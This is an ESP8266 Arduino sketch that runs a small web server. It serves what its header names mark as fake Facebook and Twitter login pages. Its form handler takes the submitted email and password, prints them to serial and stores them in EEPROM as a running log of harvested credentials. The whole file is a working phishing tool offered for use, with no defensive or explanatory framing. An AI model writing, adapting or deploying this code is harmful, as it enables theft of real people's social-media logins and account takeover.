#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include "index.h"
#include "facebook_login.h"
#include "twitter_login.h"

#include <EEPROM.h>
void writeString(char add,String data);

 
// Replace with your network credentials
const char* ssid = "YOUR_SSID";
const char* password = "YOUR_SSID_PASS";

// Set your Static IP address config
IPAddress local_IP(192, 168, 1, 184);
IPAddress gateway(192, 168, 1, 1);
IPAddress subnet(255, 255, 0, 0);


//Memory variable
int addr = 0;


ESP8266WebServer server(80); //Server on port 80

void handleRoot() {
  String s = MAIN_page; //Read HTML contents
  server.send(200, "text/html", s); //Send web page
}

void handleFacebook() {
  String s = FACEBOOK_page;
  server.send(200, "text/html", s);
}

void handleTwitter() {
  String s = TWITTER_page;
  server.send(200, "text/html", s);
}


void handleForm() {
  String mail = server.arg("mail");
  String pass = server.arg("password");
  
  Serial.print(mail);
  Serial.print(":");
  Serial.println(pass);

  String cred = "[" + mail + ":" + pass + "]";

  writeString(addr, cred);

  addr += cred.length();
  
  handleRoot();
}


void setup(void){
  Serial.begin(115200);
  EEPROM.begin(512);

  WiFi.config(local_IP, gateway, subnet);
  
  WiFi.begin(ssid, password);     //Connect to your WiFi router
  Serial.println("");
  
 
  // Wait for connection
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
 
  //If connection successful show IP address in serial monitor
  Serial.println("");
  Serial.print("Connected to ");
  Serial.println(ssid);
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());       //IP address assigned to your ESP
 
  server.on("/", handleRoot);           
  server.on("/action_page", handleForm);
  server.on("/Facebook_Login.html", handleFacebook);
  server.on("/Twitter_Login.html", handleTwitter);
 
  server.begin(); //Start server
  Serial.println("HTTP server started");
}

void loop(void){
  server.handleClient();          //Handle client requests
}

void writeString(char add,String data)
{
  int _size = data.length();
  int i;
  for(i=0; i <_size; i++)
  {
    EEPROM.write(add+i,data[i]);
  }
  EEPROM.write(add+_size,'\0');   //Add termination null character for String Data
  EEPROM.commit();
}
